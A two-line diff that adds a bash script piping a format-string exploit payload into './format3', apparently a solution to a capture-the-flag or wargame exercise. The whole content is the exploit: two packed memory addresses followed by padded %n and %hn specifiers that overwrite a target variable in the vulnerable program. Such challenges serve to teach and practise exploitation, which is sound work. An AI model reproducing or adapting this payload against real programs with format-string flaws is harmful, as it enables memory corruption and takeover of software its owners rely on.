@@ -1,0 +1,2 @@
+#!/bin/bash
+python -c "print '\xf6\x96\x04\x08\xf4\x96\x04\x08' + '%0250x' + '%12\$n' + '%021570x' + '%13\$hn'" | ./format3
